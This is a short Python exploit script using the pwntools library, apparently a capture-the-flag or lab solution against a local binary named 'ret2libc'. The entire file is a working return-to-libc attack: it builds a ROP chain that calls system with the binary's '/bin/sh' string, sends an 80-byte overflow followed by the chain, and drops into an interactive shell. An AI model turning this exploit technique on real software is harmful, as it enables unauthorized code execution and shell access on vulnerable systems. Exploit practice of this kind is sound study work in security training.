#!/usr/bin/python
from pwn import *
context.arch = "amd64"

e = ELF("./ret2libc")
rop = ROP("./ret2libc")
rop.system(e.search("/bin/sh").next())

p = process("./ret2libc")
p.sendline("A" * 80 + rop.chain())
p.interactive()
